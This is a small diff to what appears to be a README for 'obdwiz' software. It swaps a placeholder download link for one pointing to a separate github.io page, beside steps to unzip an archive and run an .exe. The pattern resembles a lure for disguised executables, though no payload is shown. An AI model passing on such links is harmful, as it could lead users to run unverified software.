@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://obdwiz-download.github.io/.github/)
 
 ## 📸 Overview
 ![obdwiz-realtime-data](https://github.com/user-attachments/assets/21fa0e46-fd60-4a58-bf4d-14dcb0e62670)
